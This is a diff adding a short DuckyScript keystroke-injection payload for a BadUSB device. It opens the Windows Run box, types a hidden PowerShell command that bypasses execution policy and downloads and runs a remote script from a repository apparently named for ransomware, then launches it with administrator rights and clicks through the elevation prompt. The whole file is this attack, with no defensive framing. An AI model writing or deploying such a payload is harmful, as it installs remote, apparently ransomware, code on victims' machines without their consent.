@@ -1,0 +1,9 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -EP Bypass -W Hidden -C "irm https://raw.githubusercontent.com/apoloxwzz/example_ransom/main/install.ps1 | iex"
+DELAY 300
+CONTROL SHIFT ENTER
+DELAY 2000
+LEFT
+ENTER
